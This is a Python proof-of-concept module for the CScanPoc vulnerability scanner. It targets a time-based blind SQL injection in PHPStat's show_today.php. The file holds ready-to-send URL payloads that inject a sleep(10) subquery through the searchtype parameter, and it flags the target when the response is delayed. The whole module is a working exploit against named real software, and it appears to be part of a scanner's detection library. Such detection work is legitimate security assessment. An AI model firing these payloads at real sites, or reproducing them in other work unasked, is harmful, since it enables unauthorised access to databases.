# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'PHPStat_0002'  # 平台漏洞编号，留空
    name = 'PHPStat SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-28'  # 漏洞公布时间
    desc = '''
        PHPStat 网站流量统计,是通过统计网站访问者的访问来源、访问时间、访问内容等访问信息,加以系统分析,进而总结出访问者访问来源、爱好趋向、访问习惯等一些共性数据，为网站进一步调整做出指引的一门新型用户行为分析技术。
        漏洞文件：show_today.php，其中参数：searchtype、searchkey、orderstr均存在延时注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3751/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPStat'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f87af49a-03f5-4677-871b-0795d34ad8ca'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            data_sleep = "/show_today.php?action=today&costtype=&endtime=2015-07-16&enginekey=&fromtype=&mediumkey=&orderby=&orderstr=desc&pagesize=10&ploykey=&searchkey=1&searchtype=1%20order%20by%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20(substring((select(sleep(10))),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b);%23&selectinfotype=&server=d1&starttime=2015-07-16&types=&userkey=&website=1"
            data_normal = "/show_today.php?action=today&costtype=&endtime=2015-07-16&enginekey=&fromtype=&mediumkey=&orderby=&orderstr=desc&pagesize=10&ploykey=&searchkey=1&searchtype=1%20order%20by%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20(substring((select(version())),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b);%23&selectinfotype=&server=d1&starttime=2015-07-16&types=&userkey=&website=1"
            url_sleep = self.target + data_sleep
            url_normal = self.target + data_normal
            time_start = time.time()
            requests.get(url_normal)
            time_end_normal = time.time()
            requests.get(url_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 9:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
